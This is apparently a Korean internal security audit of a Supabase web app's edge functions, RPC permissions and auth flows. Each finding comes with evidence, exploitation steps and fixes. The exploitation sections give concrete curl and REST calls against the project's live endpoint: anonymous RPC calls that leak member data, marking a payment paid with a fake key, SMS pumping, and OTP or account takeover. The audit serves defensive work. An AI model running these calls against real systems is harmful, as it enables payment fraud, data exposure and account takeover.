# 미감사 영역 5개 점검 — 2026-09-14

대상: Edge 6개(partner-account · kashikiri-confirm · taam-sms-hook · toss-billing-issue · notify-visit-reminder · notify-guest-expiry) · taam-format(호출부 역추적) · Storage 정책 · Auth 흐름 · 네이티브/배포.

방법: 영역별 조사자 10 → 발견 78건 → 반박자(재현·기존 방어) 검증. 사용량 한도로 반박자가 못 돈 9건은 세션에서 직접 코드로 확인했다(아래 「직접 확인」). low 45건은 검증 없이 「미검증」으로 둔다.

전체 결과 JSON: 이 문서와 같은 커밋의 `docs/audit5_result.json`.


## 1. 검증 통과 (반박자가 못 깨뜨림)

| 심각도 | 영역 | 발견 | 위치 |
|---|---|---|---|
| high | edge:kashikiri-confirm | 확정 RPC(taam_kashikiri_mark_paid / _v2)가 anon·authenticated 에게 열려 있을 가능성 — 토큰만 있으면 토스 결제 없이 청구를 'paid' 로 만든다 | `kashikiri_fx_pay.sql:311` |
| high | edge:taam-sms-hook | sms_type 을 보지 않고 phone_change(new_phone) 를 무조건 우선 — 남아 있는 미완료 번호변경이 이후 모든 로그인 OTP 를 엉뚱한 번호로 보낸다 | `index.ts:147` |
| medium | edge:partner-account | reset·revoke 의 「전 기기 강제 로그아웃」이 작동하지 않는다 — admin.signOut 에 user_id 를 넘긴다 (JWT 자리) | `index.ts:160` |
| medium | edge:partner-account | 가짜 도메인 partner.taam.kr 를 실제 Auth 이메일로 쓴다 — 도메인을 남이 쥐면 비밀번호 재설정 메일로 매장 계정을 통째로 가져간다 | `index.ts:37` |
| medium | edge:taam-sms-hook | 수신번호 국가·형식 허용목록 없음 — 국제번호를 그대로 Solapi 에 넘긴다 (SMS 펌핑 / 비용 공격) | `index.ts:94` |
| medium | edge:notify-visit-reminder | RPC taam_visit_reminder_notify 가 anon/authenticated 에게 실행 가능(기본 권한 미회수) — 전 회원의 방문 일정(user_id·매장·시간) 노출 + 그날 푸시 전체 무력화 | `visit_reminder.sql:158` |
| medium | edge:notify-visit-reminder | notif_prefs.remindN 에 boolean 이 아닌 값이 하나라도 있으면 ::boolean 캐스트 예외로 함수 전체가 죽어 그날 전 회원 리마인드가 중단된다 (티켓 보유 회원이 고의로 만들 수 있음) | `visit_reminder.sql:100` |
| medium | edge:notify-visit-reminder | Edge Function 이 호출자를 전혀 확인하지 않는다 — anon 키만 있으면 누구나 리마인드 발송을 트리거(시각 조작·중복 발송·비용) | `index.ts:80` |
| medium | edge:notify-guest-expiry | 게스트가 자기 guest_expires_at 을 직접 고칠 수 있다 — 90일 만료·만료 알림 통째로 우회 | `notif_prefs_server.sql:31` |
| medium | edge:notify-guest-expiry | RPC taam_guest_expiry_notify 의 EXECUTE 가 anon·authenticated 에게 남아 있다 — 익명 호출로 슈퍼어드민 uid·게스트 이름이 돌아온다 | `guest_expiry_notice.sql:127` |
| medium | edge:notify-guest-expiry | 좌석 홀드(PAYH-, status=hold) INSERT 만으로 게스트 기한이 +90일 밀린다 — 결제 없이 무한 연장 | `guest_expiry_on_purchase.sql:34` |
| medium | taam-format | taam-format 이 호출자를 검증하는지 저장소로는 확인 불가 — 옛 소스는 인증이 전혀 없었고, 09-13 보강 목록에서도 빠졌다 | `index.html:86625` |
| medium | taam-format | AI·Google 유래 문자열을 이스케이프 없이 innerHTML — 슈퍼어드민 세션에서 XSS (raw 오류 경로가 특히 직접적) | `index.html:86639` |
| low | edge:partner-account | revoke/restore 가 admin_grants 쓰기 오류를 무시하고 장부만 바꾼다 — 실패 시 「해지됐다」고 보이는데 권한은 그대로(fail-open) | `index.ts:178` |
| low | edge:notify-visit-reminder | 푸시는 at-most-once — 알림 행이 먼저 커밋되므로 send-push 실패·타임아웃·cron 결손분은 재시도 없이 영구 유실되고 아무도 모른다 | `index.ts:117` |
| low | edge:notify-guest-expiry | Edge Function 이 호출자를 전혀 확인하지 않는다 — anon key 만 있으면 누구나 발송 시점을 정하고 무제한 호출 | `index.ts:45` |

### 고치는 법 (검증 통과분)

**[high] 확정 RPC(taam_kashikiri_mark_paid / _v2)가 anon·authenticated 에게 열려 있을 가능성 — 토큰만 있으면 토스 결제 없이 청구를 'paid' 로 만든다**

- 근거: 「미확인 — 라이브 ACL 은 대시보드/SQL 로 확인 필요. 확인되면 critical」

sql/kashikiri_fx_pay.sql:311-312
  revoke all on function public.taam_kashikiri_mark_paid_v2(text, text, numeric, text, text, text) from public;
  -- authenticated 에게도 주지 않는다. service_role 만 부른다.
sql/kashikiri.sql:423-424 도 동일 (taam_kashikiri_mark_paid … from public; 만).

함수 본문에는 호출자 검사가 한 줄도 없다 (is_super_admin · auth.uid() · request.jwt.claims.role 어느 것도 안 본다). 권한이 오로지 GRANT 에만 기대고 있다.

Supabase 는 public 스키마에 `alter default privileges … grant all on functions to postgres, anon, authenticated, service_role` 이 걸려 있어, SQL Editor(postgres)로 create function 하면 anon·authenticated 에게 **명시 GRANT** 가 붙는다. `revoke … from public` 은 암묵적 PUBLIC 만 걷어내고 명
- 악용: 링크 `/pay/?t=<token>` 을 받은 결제자(또는 QR·전달 메시지로 링크를 본 누구나)가 앱을 거치지 않고 anon key(pay/index.html:182 에 노출된 공개 키) 로:
① POST /rest/v1/rpc/taam_kashikiri_order_start {p_token} → {order_id, currency:'JPY', amount:112500}
② POST /rest/v1/rpc/taam_kashikiri_mark_paid_v2 {p_order_id, p_payment_key:'fake', p_amount:112500, p_currency:'JPY'} → {ok:true}
→ kashikiri_charges.status='paid', payment_key='fake', method/receipt null. 토스 승인은 한 번도 안 났다. 어드민 화면(index.html:34539)에는 ✓ 결제로 보이고, TAAM 은 매장에 엔화를 이미 지급(venue_p
- 고침: ① 즉시(SQL Editor):
  revoke all on function public.taam_kashikiri_mark_paid(text,text,bigint,text,text) from public, anon, authenticated;
  revoke all on function public.taam_kashikiri_mark_paid_v2(text,text,numeric,text,text,text) from public, anon, authenticated;
  grant execute on function public.taam_kashikiri_mark_paid_v2(text,text,numeric,text,text,text) to service_role;
② 함수 안에서 한 번 더(권한 실수에 대한 2겹) — taam_apply_deposit_delta 와 같은 패턴: `if auth.uid() is not null or (coalesce(current_setting('request.jwt.claims',true)::jsonb->>'role','') <> 'service_role' and session_user <> 'postgres') then raise exception '권한이 없습니다' using errcode='42501'; end if;`
③ 확인: `select proname, proacl from pg_proc where proname like 'taam_kashikiri_mark_paid%';` — proacl 에 anon= / authenticated= 가 없어야 정상.
④ 사후 점검: `select order_id, payment_key, method, receipt_url, approved_at from kashikiri_charges where s

**[high] sms_type 을 보지 않고 phone_change(new_phone) 를 무조건 우선 — 남아 있는 미완료 번호변경이 이후 모든 로그인 OTP 를 엉뚱한 번호로 보낸다**

- 근거: const phone = String(user.phone_change || user.new_phone || user.phone || payload.phone || ''); — smsType(138줄에서 읽음)을 분기에 쓰지 않는다. GoTrue 는 updateUser({phone}) 시 auth.users.phone_change 에 새 번호를 넣고(훅 페이로드에는 new_phone 으로 직렬화), verifyOtp(type:'phone_change') 로 확정될 때만 지운다. OTP 만료·포기·오타로 확정되지 않으면 값은 무기한 남는다(저장소 어디에도 phone_change 를 지우는 SQL·앱 코드 없음 — grep 결과 0건). 그 뒤 signInWithOtp({phone}) 로그인(sms_type='sms')도 같은 user 객체를 훅에 넘기므로, 이 줄이 남아 있는 new_phone 을 집어 로그인 OTP 를 옛 번호변경 대상에게 보낸다. (GoTrue 의 phone_change 지속·new_phone 직렬화는 GoTrue 소스 기억에 근거 — 라이브 재현 미확인)
- 악용: ① 사고 경로: 회원이 마이페이지 「번호 인증」(pvSendCode, index.html 28203)에서 010-xxxx 를 잘못 입력하고 문자가 안 와 포기 → 이후 그 회원의 SMS 로그인 인증번호가 전부 오타 번호의 제3자에게 간다. 본인은 영영 로그인 불가, 제3자는 회원의 번호만 알면 verifyOtp({phone:회원번호, token, type:'sms'}) 로 로그인 가능. ② 공격 경로: 피해자 계정 세션을 잠깐 쥔 공격자(공유 기기·1h 잔여 access token)가 sb.auth.updateUser({phone:'+82공격자번호'}) 만 부르고 확정하지 않는다 → 이후 피해자가 로그인할 때마다 OTP 가 공격자 폰에 도착 → 공격자가 verifyOtp 로 피해자 세션 획득. signOut({scope:'others'})·기기 세션 폐기로도 안 풀리는 영속 백도어이며 피해자는 로그인이 안 되므로 알아채도 스스로 못 고친다.
- 고침: sms_type 으로 목적지를 고정한다: const isChange = smsType === 'phone_change'; const phone = isChange ? String(user.new_phone || user.phone_change || '') : String(user.phone || ''); — 로그인·가입·재인증에서는 new_phone 을 절대 보지 않는다. 라이브 점검: select id, phone, phone_change, phone_change_sent_at from auth.users where coalesce(phone_change,'')<>'' — 남아 있는 행은 지금 로그인 OTP 가 잘못 가는 회원이므로 phone_change='' 로 정리(슈퍼어드민이 auth.users 직접 수정). 운영상 phone_change_sent_at 이 1일 넘은 행을 주기적으로 비우는 cron 추가.

**[medium] reset·revoke 의 「전 기기 강제 로그아웃」이 작동하지 않는다 — admin.signOut 에 user_id 를 넘긴다 (JWT 자리)**

- 근거: 160: await admin.auth.admin.signOut(row.user_id, 'global').catch(() => {});
179: await admin.auth.admin.signOut(row.user_id, 'global').catch(() => {});

auth-js GoTrueAdminApi.ts:
  /** @param jwt A valid, logged-in JWT. */
  async signOut(jwt: string, scope: SignOutScope = 'global') {
    await _request(this.fetch, 'POST', `${this.url}/logout?scope=${scope}`, { headers: this.headers, jwt, noResolveJson: true })

첫 인자는 사용자의 access token 이다. uuid 를 넣으면 GoTrue /logout 이 401 을 돌려주고, signOut 은 예외를 던지지 않고 {error} 로 돌려주므로 .catch 조차 타지 않는다. 결과값을 보지 않으니 어떤 로그도 남지 않는다. 주석(158-159줄)이 이 줄을 「비번 바꾸면 침해당할 일 없다」의 근거로 삼고 있는데 그 근거가 비어 있다.
- 악용: ① 파트너 비밀번호가 새서 침입자가 매장 어드민으로 로그인해 있다. 슈퍼어드민이 reset 을 누른다 → 새 비밀번호가 나가고 화면엔 성공. 그러나 침입자의 refresh token 은 그대로 살아 있고(회전만 되고 만료가 없다), admin_grants 도 그대로다 → 침입자는 계속 그 매장의 예약·손님 이름·전화번호를 본다(tickets RLS 는 admin_grants 만 본다). ② revoke 도 같다: admin_grants 는 지워지지만 세션은 살아 있어 revoke 된 파트너가 authenticated 권한으로 REST/RPC 를 계속 부를 수 있고, partner_admin_sync.sql ② 로 restaurant_admins 에도 복사돼 있었다면 is_restaurant_admin_of 가 레거시 표를 인정하므로 손님 데이터가 계속 보인다.
- 고침: GoTrue 어드민 API 에는 「user_id 로 로그아웃」이 없다. Postgres 에서 세션을 지운다:
  create function public.taam_kill_sessions(p_uid uuid) returns int language plpgsql security definer set search_path = auth, public as $$ declare n int; begin delete from auth.sessions where user_id = p_uid; get diagnostics n = row_count; return n; end $$;
  revoke all on function public.taam_kill_sessions(uuid) from public, anon, authenticated;  -- service_role 만
함수에서는 const { error } = await admin.rpc('taam_kill_sessions', { p_uid: row.user_id }); 를 부르고 error 면 ok:false 로 멈춘다(지금처럼 삼키지 않는다). refresh_tokens 는 sessions 에 cascade 라 함께 죽는다. access token 은 만료(기본 1h)까지 남으니 JWT expiry 단축과 함께 둔다. revoke 에는 추가로 updateUserById(uid, { ban_duration: '876000h' }) 를, restore 에는 { ban_duration: 'none' } 을 넣어 비밀번호 자체를 무력화한다.

**[medium] 가짜 도메인 partner.taam.kr 를 실제 Auth 이메일로 쓴다 — 도메인을 남이 쥐면 비밀번호 재설정 메일로 매장 계정을 통째로 가져간다**

- 근거: 37: const PARTNER_DOMAIN = 'partner.taam.kr';
83: const email = `${loginId}@${PARTNER_DOMAIN}`;
96-99: admin.auth.admin.createUser({ email, password, email_confirm: true, ... })
주석(35-36): 「이 도메인으로 메일이 가는 일은 없다 … 실재해서도 안 된다」— 그러나 Supabase Auth 는 이메일 제공자가 켜져 있는 한(파트너가 email+password 로 로그인하므로 켜져 있다) anon key 로 POST /auth/v1/recover 와 /auth/v1/otp(매직링크) 를 누구나 부를 수 있고, 앱이 안 불러도 API 는 열려 있다. 프로젝트의 실제 도메인은 playtaam.com(슈퍼어드민 이메일, sql/set_super_admin_dnfmeod.sql)이고 taam.kr 는 저장소 어디에도 없다 → TAAM 이 taam.kr 를 소유하는지 **미확인**. 커스텀 SMTP 설정 여부도 **미확인**(기본 SMTP 는 팀원 주소에만 보낸다). 또 trg_sync_profile_email 이 이 가짜 주소를 profiles.email 에 복사한다.
- 악용: taam.kr 가 TAAM 소유가 아니고(또는 만료되고) 커스텀 SMTP 가 켜져 있다면: 공격자가 taam.kr 를 등록해 partner.taam.kr 의 MX 를 자기 서버로 둔다 → anon key 로 POST /auth/v1/recover {email:'sushi-arai@partner.taam.kr'} (login_id 는 _paSuggestId 가 매장 영문명에서 만들므로 추측 가능) → 재설정 링크가 공격자 메일함에 온다 → 비밀번호를 바꾸고 그 매장 어드민으로 로그인, 손님 개인정보·예약 전부 열람. 매직링크(/otp) 도 같은 길이다. 부수적으로 profiles.email 로 어떤 안내 메일이든 보내는 코드가 생기면 그 내용도 공격자에게 간다.
- 고침: ① TAAM 이 소유한 도메인의 하위로 바꾼다(예: partner.playtaam.com) 하고 DNS 에 Null MX(RFC 7505: `MX 0 .`) 를 둬 메일이 원리적으로 안 가게 한다. 기존 계정은 updateUserById(uid, { email: newEmail, email_confirm: true }) 로 옮기고 앱의 PARTNER_LOGIN_DOMAIN 도 같이 바꾼다(둘이 다르면 로그인이 「비밀번호 틀림」으로 보인다). ② Auth 「Send Email」 훅(또는 커스텀 SMTP 규칙)에서 파트너 도메인 수신자를 버린다. ③ 그때까지: WHOIS 로 taam.kr 소유 확인, 소유가 아니면 등록.

**[medium] 수신번호 국가·형식 허용목록 없음 — 국제번호를 그대로 Solapi 에 넘긴다 (SMS 펌핑 / 비용 공격)**

- 근거: function toDomestic(phone){ … if (p.startsWith('+82')) return '0'+p.slice(3); … return p.replace(/^\+/, ''); } — +82 만 국내로 바꾸고 나머지(+1, +63, +44 …)는 '+' 만 떼서 184줄 message.to 에 그대로 넣는다. Solapi 는 국가번호가 앞에 붙은 번호를 국제문자로 접수한다(국내 8~20원 대비 수십~수백 원). 훅 자체에는 건수·번호·시간창 제한이 하나도 없고, GoTrue 의 프로젝트 전역 SMS 한도(기본 30건/시간)와 번호당 최소 간격만이 유일한 방벽이다. 앱은 010 11자리만 넣지만(_pvNormalize 28154, vpSend 18715) 훅은 앱을 거치지 않은 요청도 똑같이 처리한다.
- 악용: anon key 는 index.html 안에 있다. 공격자가 POST https://edfsmzbcixfnqabrsvut.supabase.co/auth/v1/otp {"phone":"+1900…","create_user":true} 를 번호를 바꿔가며 반복 → 매 건 훅 → Solapi 국제문자 발송, 잔액 소진(공격자가 수익을 나누는 프리미엄 번호면 직접 금전 이득). 부수 효과: create_user:true 라 초대코드 없이 임의 전화번호·display_name 의 auth.users 유령 행이 생긴다(앱 가입 모드가 shouldCreateUser=true 라 Phone signups 를 끌 수 없음). Solapi 잔액이 바닥나면 정상 회원의 로그인 문자도 전부 실패한다(가용성).
- 고침: 훅에서 목적지를 검증한다: const d = toDomestic(phone); if (!/^010\d{8}$/.test(d)) return hookErr(400, '허용되지 않는 수신번호'); (일본 회원에게 SMS 를 열 계획이 있으면 +81 만 별도 허용). 여기에 서버 카운터를 붙인다 — createClient(SUPABASE_URL, SERVICE_ROLE_KEY).rpc('taam_rate_hit', {key:'sms:'+d, limit:5, window:'1 hour'}) 와 전역 키 'sms:all' 일 300건 정도. 대시보드에서 SMS 시간당 한도·번호당 간격을 낮추고 Auth Captcha(Turnstile) 를 켠 뒤 signInWithOtp 에 captchaToken 을 실어 보낸다. Solapi 콘솔에서 국제문자 사용을 끈다.

**[medium] RPC taam_visit_reminder_notify 가 anon/authenticated 에게 실행 가능(기본 권한 미회수) — 전 회원의 방문 일정(user_id·매장·시간) 노출 + 그날 푸시 전체 무력화**

- 근거: `revoke all on function public.taam_visit_reminder_notify() from public;` 만 있다. Supabase 는 public 스키마 함수에 anon·authenticated·service_role 로 EXECUTE 를 주는 default privileges 가 걸려 있어 PUBLIC 회수만으로는 anon/authenticated 의 명시 grant 가 남는다 — 저장소도 이를 안다(sql/membership_apply.sql:59-61 「Supabase 는 public 의 새 표에 anon·authenticated 까지 전부 열어 두는 default privileges 가 걸려 있다」, sql/fix_email_exists_confirmed_only.sql:40-43 은 `revoke … from anon; … from authenticated; grant … to service_role` 로 올바르게 처리). 함수는 `security definer`(78행)이고 본문(80-152행)에 auth.uid()/service_role 검사가 전혀 없다 (비교: sql/ledger_close_member_insert.sql:105 `if v_jwt = 'service_role' or session_user = 'postgres'`). 반환값(136-151행)은 대상 회원 전원의 user_id
- 악용: index.html 에 든 anon 키만으로: `curl -X POST https://edfsmzbcixfnqabrsvut.supabase.co/rest/v1/rpc/taam_visit_reminder_notify -H 'apikey: <anon>' -H 'Authorization: Bearer <anon>' -H 'Content-Type: application/json' -d '{}'`. ① 응답 rows 에 그날 D-7/3/1 인 모든 회원의 user_id·매장명·방문시각이 실린다(누가 언제 어디서 식사하는지 열거). ② 자정(KST) 직후 매일 이렇게 부르면 알림 행이 먼저 들어가 11시 cron 의 notify-visit-reminder 는 `made:0` 을 보고 **아무에게도 푸시를 안 보낸다** — visit_reminder.sql:163-166 이 경고한 「SQL 이 먼저 넣으면 푸시를 놓친다」가 외부인 손으로 매일 재현된다. cron 응답은 200·ok:true 라 
- 고침: SQL Editor 실행 필요: `revoke execute on function public.taam_visit_reminder_notify() from public, anon, authenticated; grant execute on function public.taam_visit_reminder_notify() to service_role;` (taam_guest_expiry_notify 도 동일). 권한에만 기대지 말고 함수 첫 줄에 호출자 검사를 넣는다: `if not (coalesce(current_setting('request.jwt.claims',true)::jsonb->>'role','') = 'service_role' or session_user = 'postgres' or public._taam_uid_is_super()) then raise exception 'FORBIDDEN' using errcode='42501'; end if;`. 확인: `select has_function_privilege('anon','public.taam_visit_reminder_notify()','execute') as anon_exec, has_function_privilege('authenticated','public.taam_visit_reminder_notify()','execute') as auth_exec;` → 둘 다 false.

**[medium] notif_prefs.remindN 에 boolean 이 아닌 값이 하나라도 있으면 ::boolean 캐스트 예외로 함수 전체가 죽어 그날 전 회원 리마인드가 중단된다 (티켓 보유 회원이 고의로 만들 수 있음)**

- 근거: `(p.notif_prefs ->> ('remind' || k.d::text))::boolean` — `->>` 는 text 를 돌려주므로 값이 `"x"`·`{}`·`[]`·`1.5` 등이면 `invalid input syntax for type boolean` 으로 **문장 전체**(CTE 하나)가 롤백된다. coalesce 는 캐스트가 성공한 뒤에야 폴백을 본다. profiles 의 'profiles update own' 정책(sql/notif_prefs_server.sql:31-34)은 컬럼·모양을 가리지 않고(sql/guard_profile_exempt.sql:5 도 같은 지적) notif_prefs 를 검증하는 CHECK·트리거는 sql/ 어디에도 없다(grep 결과 컬럼 추가와 진단 쿼리뿐). 앱은 로드 시 `typeof d[k]==='boolean'` 인 것만 받아(index.html:86393) 오염값을 화면에서 걸러 주기 때문에 회원 본인도 이상을 못 느낀다. send-push 쪽(724행 `pref[_prefKey] === false`)은 JS 비교라 안 죽는다 — SQL 만 죽는다. Edge 는 90행에서 500 을 돌려주고 끝. 전제: 캐스트는 pick(=활성 티켓이 D-7/3/1 인 행)에 조인된 프로필에서만 평가되므로, 공격자는 활성 티켓 1장이 필요하고 그 티켓의 D-7·D-3·D-1 세 날에 전 회원 리마
- 악용: 티켓을 한 장 산 회원이 자기 세션으로 `PATCH /rest/v1/profiles?id=eq.<내uuid>` body `{"notif_prefs":{"remind7":"x","remind3":"x","remind1":"x"}}` (RLS 통과, 자기 행). 방문 D-7·D-3·D-1 에 cron 이 돌면 `taam_visit_reminder_notify` 가 예외 → notify-visit-reminder 500 → 그날 **모든 회원**의 인앱 알림·푸시가 안 나간다. net._http_response 에 500 이 찍힐 뿐 아무도 보지 않고, 다음 날은 일수가 바뀌어 놓친 D-N 은 영구히 안 간다(93행 `d in (1,3,7)` 은 따라잡기가 없다).
- 고침: SQL Editor 실행 필요. ① 캐스트를 없애고 jsonb 값 비교로 바꾼다(send-push 와 같은 「명시적 false 만 막는다」 의미): `where case when k.d = 7 then (p.notif_prefs -> 'remind7') = 'true'::jsonb else (p.notif_prefs -> ('remind'||k.d::text)) is distinct from 'false'::jsonb end`. ② profiles.notif_prefs 모양을 서버가 지킨다: `alter table public.profiles add constraint chk_notif_prefs_bool check (notif_prefs = '{}'::jsonb or not exists (select 1 from jsonb_each(notif_prefs) where jsonb_typeof(value) <> 'boolean')) not valid;` 후 오염 행 정리 → `validate constraint`. ③ Edge 는 RPC 오류를 로그로 남기고 cron 감시(대시보드 항목 참조). 사전 점검: `select id, notif_prefs from public.profiles where exists (select 1 from jsonb_each(notif_prefs) where jsonb_typeof(value) <> 'boolean');` → 0건이어야 한다.

**[medium] Edge Function 이 호출자를 전혀 확인하지 않는다 — anon 키만 있으면 누구나 리마인드 발송을 트리거(시각 조작·중복 발송·비용)**

- 근거: 80-90행: OPTIONS 처리 뒤 바로 `createClient(url, svc)` → `admin.rpc('taam_visit_reminder_notify')`. Authorization 헤더를 읽는 줄이 없다. 게이트웨이 Verify JWT 는 anon 키(유효한 JWT)도 통과시킨다. 비교: toss-confirm 75-90행은 Bearer→getUser, send-push 527-530행은 `t === SERVICE_KEY` 로 서버 호출을 가린다, taam-translate-venues-batch 96행은 「슈퍼어드민·service_role·cron 만」. 속도 제한(taam_rate_hit)도 없다. 중복: sql/visit_reminder.sql:122-127 의 `not exists` 는 unique 인덱스 없이(sql/notifications.sql 에 unique 없음) READ COMMITTED 에서 동시 두 트랜잭션이 모두 통과할 수 있다 → 같은 티켓·같은 일수 알림 행 2개 + 푸시 2번(send-push 의 dedupe 는 한 호출 안의 endpoint 중복만 거른다, 675-681행). 앱은 이 함수를 부르지 않으므로(index.html grep: 주석 1건) 정당한 호출자는 cron 뿐이다.
- 악용: `curl -X POST https://edfsmzbcixfnqabrsvut.supabase.co/functions/v1/notify-visit-reminder -H 'Authorization: Bearer <anon>' -H 'apikey: <anon>'`. ① KST 자정 직후 호출하면 11시 대신 **한밤중에** 그날 대상 전원에게 푸시가 간다(정당한 알림이라 회원은 서비스 탓으로 본다). ② 자정 직후 같은 요청을 동시에 여러 개 던지면 not exists 경합으로 같은 회원에게 알림·푸시가 중복된다. ③ 호출마다 RPC + N회 send-push(웹푸시·APNs 발신)가 실행돼 비용·쿼터를 태운다. 발견 1 을 고쳐도 이 경로는 남는다(함수는 service key 로 RPC 를 부르므로).
- 고침: 함수 첫머리에서 서버 호출만 받는다: `const t = (req.headers.get('Authorization')||'').replace(/^Bearer /,''); if (!t || t !== svc) return json({ok:false,error:'forbidden'},403);` (send-push 527-530행과 같은 방식; 또는 별도 `CRON_SECRET` 시크릿과 `x-cron-key` 헤더 비교). 대시보드 Cron 명령은 Vault 의 legacy service_role JWT 를 Authorization 에 싣는다(CLAUDE.md 규칙). 경합 방지: `create unique index if not exists uq_notif_visit_reminder on public.notifications ((payload->>'ticket_id'), (payload->>'days')) where type = 'visit_reminder';` 를 만들고 visit_reminder.sql 의 insert 에 `on conflict do nothing` 을 붙인다.

**[medium] 게스트가 자기 guest_expires_at 을 직접 고칠 수 있다 — 90일 만료·만료 알림 통째로 우회**

- 근거: notif_prefs_server.sql:31-34 `create policy "profiles update own" on public.profiles for update to authenticated using (auth.uid() = id) with check (auth.uid() = id)` — 컬럼을 가리지 않는다(guard_profile_exempt.sql:5 에 「정책은 컬럼을 가리지 않는다」고 스스로 적어 둠). profiles 에 걸린 트리거 13개를 전부 훑었는데 guest_expires_at 을 되돌리거나 막는 것이 **없다**: guard_membership_tier.sql:108-156 은 membership_tier·membership_expires_at 만, guard_profile_role/exempt/currency/deposit 은 각자 컬럼만 본다. guard_profile_exempt.sql:12 는 「guest_expires_at 은 이미 트리거가 지킨다」고 적었지만 그런 트리거는 저장소 어디에도 없다(sql/ 전수 grep). 오히려 guest_expiry_init.sql:54 `before insert or update of membership_tier, guest_expires_at` 트리거가 :32-36 에서 `if new.guest_expires_at is null then new.gues
- 악용: 게스트(A) 회원이 앱 없이 anon key + 자기 JWT 로 `PATCH /rest/v1/profiles?id=eq.<내uid>` 본문 `{"guest_expires_at":"2099-01-01"}` 한 번 → 영구 게스트. 또는 `{"guest_expires_at":null}` 을 보내면 init 트리거가 now()+90일로 다시 세워 준다 — 89일마다 반복하면 「3개월 구매 없으면 만료」 규칙이 무력화된다. 부수 효과: 이 값이 5일 안에 안 들어오므로 taam_guest_expiry_notify 가 슈퍼어드민에게 만료 임박 알림을 절대 만들지 않고, 운영진은 그 게스트가 연장됐다는 사실을 볼 방법이 없다(taam_guest_extend 의 guest_extended_cnt 도 안 오른다).
- 고침: guard_profile_exempt 와 같은 모양으로 트리거를 하나 더 건다: `create function taam_guard_guest_expiry() ... if (new.guest_expires_at is distinct from old.guest_expires_at or new.guest_status is distinct from old.guest_status) and auth.uid() is not null and not is_super_admin(auth.uid()) then new.guest_expires_at := old.guest_expires_at; new.guest_status := old.guest_status; end if; return new;` — 예외가 아니라 값 되돌리기(같은 UPDATE 에 실린 알림 설정을 날리지 않게). 트리거 이름은 `trg_taam_guard_guest_expiry` 처럼 **'guest_expiry_init' 보다 앞**(이름순)에 두어 init 트리거가 되돌린 값을 보게 한다. 서버 경로(trg_taam_guest_touch_on_purchase · taam_guest_extend 는 security definer 라 auth.uid() 가 있어도 슈퍼어드민이거나, touch 는 트리거 안 UPDATE 라 auth.uid() 가 게스트 본인) — touch 트리거는 게스트 세션 안에서 돌므로 예외로 두려면 `current_setting('taam.touch','t')='1'` 같은 세션 플래그를 touch 함수가 set_config 로 켜고 가드가 그것을 보게 한다. 적용 후 `t_guestnotice.sh` ⑤ 가 그대로 통과하는지 확인. guard_profile_exempt.sql:12 의 잘못된 주석도 고친다.

**[medium] RPC taam_guest_expiry_notify 의 EXECUTE 가 anon·authenticated 에게 남아 있다 — 익명 호출로 슈퍼어드민 uid·게스트 이름이 돌아온다**

- 근거: guest_expiry_notice.sql:127 `revoke all on function public.taam_guest_expiry_notify() from public;` 뿐이다. Supabase 프로젝트는 public 스키마 함수에 `alter default privileges ... grant execute on functions to anon, authenticated, service_role` 이 기본으로 걸려 있어 함수를 만드는 순간 세 롤에 **명시적** EXECUTE 가 붙는다. `from public` 회수는 PUBLIC 묵시 권한만 걷어 내고 명시 grant 는 남는다. 같은 저장소의 audit_hardening_2026-09-13.sql:82 · 193 · 708 은 `revoke ... from public, anon, authenticated` 로 올바르게 쓰고 있어 이 파일만 빠진 것이다(형제 visit_reminder.sql:158 도 같은 모양). 함수는 security definer(:35) 라 anon 이 불러도 postgres 권한으로 notifications 에 INSERT 하고, :118-120 `return jsonb_build_object('admin', v_admin, 'self', v_self, 'rows', v_ids)` 로 :69·:101 의 `returning id, user_i
- 악용: index.html 에 박힌 anon key 만으로 `curl -X POST https://edfsmzbcixfnqabrsvut.supabase.co/rest/v1/rpc/taam_guest_expiry_notify -H 'apikey: <anon>' -H 'Authorization: Bearer <anon>' -H 'Content-Type: application/json' -d '{}'` → 한국시간 자정 직후에 매일 한 번 부르면 (Cron 10시보다 먼저라 새 행이 생김) `rows[]` 로 ① 슈퍼어드민 계정 uuid 전부 ② 5일 안에 만료되는 게스트의 표시 이름 ③ 그 게스트의 남은 일수가 돌아온다. 동시에 슈퍼어드민 벨에 알림이 꽂히고 인앱 알림 발생 시각을 공격자가 정한다. 로그인 없이(anon) 가능.
- 고침: guest_expiry_notice.sql:127 을 `revoke all on function public.taam_guest_expiry_notify() from public, anon, authenticated;` 로 바꾸고 `grant execute ... to service_role;` 을 명시한다(Edge Function 이 service_role 로 부른다). visit_reminder.sql:158 `taam_visit_reminder_notify()` 도 동일하게. 방어를 겹으로: 함수 첫 줄에 `if auth.uid() is not null and not is_super_admin(auth.uid()) then raise exception '권한이 없습니다' using errcode='42501'; end if;` (service_role · SQL Editor 는 auth.uid() 가 null). 확인: `select r, has_function_privilege(r,'public.taam_guest_expiry_notify()','execute') from unnest(array['anon','authenticated','service_role']) r;` 에서 anon·authenticated 가 false.

**[medium] 좌석 홀드(PAYH-, status=hold) INSERT 만으로 게스트 기한이 +90일 밀린다 — 결제 없이 무한 연장**

- 근거: guest_expiry_on_purchase.sql:56-59 트리거는 `after insert on public.tickets` 전 행에 걸리고, 함수 :31 `if coalesce(new.status,'') in ('cancelled','canceled') then return new` · :34 `if coalesce(new.purchase_id,'') like 'INVH-%' then return new` 두 가지만 건너뛴다. :33 주석은 「홀드·수동입력 행은 실제 구매가 아니다」라고 적었지만 코드는 **status='hold' 도 'PAYH-%' 도 'MAN-%' 도 걸러내지 않는다**. 회원 세션은 audit_hardening_2026-09-13.sql:288-290 `if new.status = 'hold' then return new;` 로 hold 행 INSERT 가 허용되고, 앱이 실제로 index.html:24406-24427 에서 `purchase_id: 'PAYH-'+…, price: 0, status: 'hold'` 로 넣는다. 결제를 안 마치면 seat_hold_5min.sql:33-38 이 5분 뒤 status 만 cancelled 로 바꾸지만 그때는 이미 profiles.guest_expires_at 이 :45-47 에서 now()+90일로 바뀐 뒤다. 이 컬럼이 감사 대상 함수의 대상 선정 기준이라 
- 악용: 게스트가 아무 티켓의 「결제하기」를 누르고 결제창에서 그냥 나간다(앱 UI 그대로, API 불필요). 홀드 INSERT 순간 guest_expires_at = now()+90일. 5분 뒤 홀드는 cancelled 로 풀리지만 기한은 그대로 남는다. 89일마다 한 번씩 반복하면 한 푼도 안 내고 게스트 자격이 영구히 유지되고, 슈퍼어드민에게 「만료 N일 전」 알림은 영영 안 간다.
